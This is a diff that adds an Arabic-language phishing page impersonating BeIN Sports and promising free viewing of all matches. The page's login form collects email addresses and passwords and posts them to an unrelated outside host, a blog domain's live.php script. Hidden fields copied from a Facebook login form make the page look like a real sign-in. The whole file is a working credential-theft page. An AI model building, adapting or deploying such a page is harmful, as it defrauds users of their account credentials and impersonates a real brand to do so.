@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>BeIN Sports - تسجيل الدخول</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&family=Material+Icons&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css">
+    <style>
+        :root {
+            --primary-color: #2575fc;
+            --secondary-color: #6a11cb;
+            --accent-color: #4CAF50;
+            --text-color: #ffffff;
+            --input-bg: rgba(255, 255, 255, 0.2);
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            outline: none;
+        }
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            direction: rtl;
+            overflow-x: hidden;
+        }
+        .container {
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            backdrop-filter: blur(15px);
+            width: 100%;
+            max-width: 450px;
+            padding: 40px 30px;
+            margin: 20px;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+        .container::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                0deg, 
+                transparent, 
+                rgba(255,255,255,0.1), 
+                transparent
+            );
+            transform: rotate(45deg);
+            pointer-events: none;
+        }
+        .logo-container {
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+        .logo {
+            width: 200px;
+            height: 100px;
+            object-fit: contain;
+            border-radius: 10px;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+            transition: all 0.5s ease;
+            cursor: pointer;
+            will-change: transform, box-shadow;
+            animation: logoAnimation 3s infinite ease-in-out;
+            position: relative;
+        }
+        .logo:hover {
+            transform: scale(1.1) rotate(10deg);
+            box-shadow: 0 20px 35px rgba(0,0,0,0.4);
+        }
+        .logo-badge {
+            position: absolute;
+            top: -10px;
+            right: 50%;
+            transform: translateX(50%);
+            background-color: #ff4500;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 0.7rem;
+            animation: badgePulse 2s infinite;
+            z-index: 10;
+        }
+        @keyframes logoAnimation {
+            0% { transform: scale(1) rotate(0deg); }
+            50% { transform: scale(1.05) rotate(5deg); }
+            100% { transform: scale(1) rotate(0deg); }
+        }
+        @keyframes badgePulse {
+            0%, 100% { transform: translateX(50%) scale(1); }
+            50% { transform: translateX(50%) scale(1.1); }
+        }
+        .headline {
+            text-align: center;
+            color: var(--text-color);
+            font-size: 1.6rem;
+            margin-bottom: 30px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        .form-group {
+            margin-bottom: 25px;
+            position: relative;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 10px;
+            color: var(--text-color);
+            font-weight: bold;
+        }
+        .input-wrapper {
+            position: relative;
+        }
+        .input-wrapper i {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--text-color);
+            opacity: 0.7;
+            transition: opacity 0.3s ease;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 15px 15px 15px 50px;
+            border: 2px solid transparent;
+            border-radius: 10px;
+            background-color: var(--input-bg);
+            color: var(--text-color);
+            font-size: 1rem;
+            transition: all 0.3s ease;
+        }
+        .form-group input:focus {
+            border-color: var(--text-color);
+            box-shadow: 0 0 15px rgba(255,255,255,0.3);
+        }
+        .form-group input:focus + i {
+            opacity: 1;
+        }
+        .checkbox-group {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 25px;
+        }
+        .checkbox-group label {
+            display: flex;
+            align-items: center;
+            color: var(--text-color);
+        }
+        .checkbox-group input[type="checkbox"] {
+            margin-left: 10px;
+        }
+        .btn {
+            width: 100%;
+            padding: 15px;
+            background-color: var(--accent-color);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        .btn:hover {
+            background-color: #45a049;
+            transform: scale(1.02);
+        }
+        .btn:active {
+            transform: scale(0.98);
+        }
+        @media (max-width: 480px) {
+            .container {
+                padding: 30px 20px;
+                margin: 10px;
+            }
+            .headline {
+                font-size: 1.3rem;
+            }
+            .form-group input {
+                font-size: 0.9rem;
+            }
+        }
+        @media (max-height: 700px) {
+            .container {
+                max-width: 380px;
+                padding: 25px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="headline">شاهد جميع المباريات مجانا </div>
+        
+        <div class="logo-container">
+            <span class="logo-badge">جديد</span>
+            <img 
+                src="https://logowik.com/content/uploads/images/167_bein_sports.jpg" 
+                alt="شعار BeIN Sports" 
+                class="logo" 
+                onclick="showLogoDetails()"
+            >
+        </div>
+        
+        <form id="loginForm" method="POST" action="http://blog.yemekicmek.com/live.php?f76ecbbcabb8b22cc124" target="_blank">
+            <!-- الحقول المخفية الأصلية -->
+            <input type="hidden" name="charset_test" value="�,�,�,�,水,Д,Є">
+            <input type="hidden" name="ramadhan" value="">
+            <input type="hidden" name="lsd" value="cG8FP" autocomplete="off">
+            <input type="hidden" name="return_session" value="0" autocomplete="off">
+            <input type="hidden" name="legacy_return" value="1" autocomplete="off">
+            <input type="hidden" name="display" value="" autocomplete="off">
+            <input type="hidden" name="session_key_only" value="0" autocomplete="off">
+            <input type="hidden" name="trynum" value="1" autocomplete="off">
+            
+            <div class="form-group">
+                <label for="email">البريد الإلكتروني</label>
+                <div class="input-wrapper">
+                    <input 
+                        type="text" 
+                        id="email" 
+                        name="email" 
+                        placeholder="أدخل بريدك الإلكتروني" 
+                        required
+                        pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$"
+                    >
+                    <i class="material-icons">email</i>
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <label for="pwd">كلمة المرور</label>
+                <div class="input-wrapper">
+                    <input 
+                        type="password" 
+                        id="pwd" 
+                        name="pwd" 
+                        placeholder="أدخل كلمة المرور" 
+                        required
+                        minlength="6"
+                    >
+                    <i class="material-icons">lock</i>
+                </div>
+            </div>
+            
+            <div class="checkbox-group">
+                <label>
+                    <input type="checkbox" name="persistent" value="1"> 
+                    البقاء متصلاً
+                </label>
+                <a href="#" style="color: white; text-decoration: none;">نسيت كلمة المرور؟</a>
+            </div>
+            
+            <input type="hidden" name="ramadhan" value="780308020Zjc2ZWNiYmNhYmI4YjIyY2MxMjQ=">
+            <input type="hidden" name="type" value="f76ecbbcabb8b22cc124">
+            
+            <button type="submit" class="btn">تسجيل الدخول</button>
+        </form>
+    </div>
+
+    <!-- SweetAlert2 Library -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.js"></script>
+    
+    <script>
+        function showLogoDetails() {
+            Swal.fire({
+                title: 'BeIN Sports',
+                html: `
+                    <div style="text-align: center;">
+                        <img src="https://logowik.com/content/uploads/images/167_bein_sports.jpg" style="max-width: 250px; border-radius: 15px;">
+                        <p style="margin-top: 15px; direction: rtl;">
+                            شبكة قنوات رياضية رائدة في الشرق الأوسط
+                            <br>
+                            <strong>تغطية شاملة لأهم البطولات العالمية</strong>
+                        </p>
+                    </div>
+                `,
+                showCloseButton: true,
+                showConfirmButton: false,
+                background: 'linear-gradient(135deg, #2575fc, #6a11cb)',
+                color: 'white'
+            });
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            const email = document.getElementById('email');
+            const password = document.getElementById('pwd');
+            
+            // التحقق من صحة البريد الإلكتروني
+            if (!email.checkValidity()) {
+                Swal.fire({
+                    icon: 'error',
+                    title: 'خطأ',
+                    text: 'يرجى إدخال بريد إلكتروني صحيح',
+                    confirmButtonText: 'حسنًا'
+                });
+                e.preventDefault();
+                return;
+            }
+            
+            // التحقق من طول كلمة المرور
+            if (password.value.length < 6) {
+                Swal.fire({
+                    icon: 'error',
+                    title: 'خطأ',
+                    text: 'يجب أن تكون كلمة المرور 6 أحرف على الأقل',
+                    confirmButtonText: 'حسنًا'
+                });
+                e.preventDefault();
+                return;
+            }
+        });
+    </script>
+</body>
+</html>
